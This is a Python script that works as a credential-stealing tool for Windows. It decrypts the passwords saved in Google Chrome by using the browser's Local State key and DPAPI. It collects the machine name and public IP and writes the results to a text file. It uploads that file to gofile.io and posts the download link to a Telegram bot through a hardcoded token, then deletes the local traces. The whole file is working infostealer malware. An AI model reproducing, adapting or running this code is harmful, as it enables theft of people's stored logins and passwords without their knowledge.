import shutil
import os
import json
import base64
import time
from attr import s
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess

def get_pc_name_and_public_ip():
    
    pc_name = os.getlogin()
    
    ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()
    
    with open('passwords_google_database.txt', 'a') as f:
        
        f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])

        f.close() 
        
def send_email(download_link):
    
    token = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
    
    chat_id = -1002015035900
    
    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'
    
    requests.get(url)
    
def upload_file(file):
    
    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
    
    jsdata = json.loads(res)
    
    server = jsdata['data']
    
    server = server['server']
    
    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()
    
    jsdata = json.loads(res)
    
    download_link = jsdata['data']['downloadPage']
    
    send_email(download_link)
    
def get_encrypt_key():
    
    local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))
    
    
    with open(local, 'r') as f:
        
        jsdata = json.loads(f.read())
        
    
    return jsdata['os_crypt']['encrypted_key']


def decode_encrypted_key(encrypted_key):
    
    return base64.b64decode(encrypted_key)


def decrypt_decoded_key(decoded_key):
        
    return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

def decrypt_saved_password(password, key):
    
    try:

        iv = password[3:15]
        
        password = password[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
        
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return
  
def main():
    
    encrypted_key = get_encrypt_key()

    decoded_key = decode_encrypted_key(encrypted_key)[5:]

    decrypted_key = decrypt_decoded_key(decoded_key)

    db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))

    filename = 'ChromeData.db'
    
    shutil.copyfile(db, filename)
    
    database = sqlite3.connect(filename)
    
    if database:
    

        cursor = database.cursor()
        
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        for row in cursor.fetchall():
            print('='*40)
            
            origin_url = row[0]
            action_url = row[1]
            user_or_email = row[2]
            password = row[3]
            password = decrypt_saved_password(password, decrypted_key)
            
            print('*'*50)
            
            result =f'''
{colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
{colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
{colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
{colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                  '''
            
            print(result)
            print('*'*50)
            
            with open('passwords_google_database.txt', 'a') as f:
                f.writelines([f'Origin Url: {origin_url}', '\n', f'Action Url: {action_url}', '\n', f'Username: {user_or_email}', '\n', f'Password: {password}', '\n','='*40, '\n\n'])
              
    database.close()           
    os.remove('ChromeData.db')
                
if __name__ == '__main__':
    colorama.init(convert=True)
    get_pc_name_and_public_ip()
    main()
    upload_file('passwords_google_database.txt')
    os.remove('passwords_google_database.txt')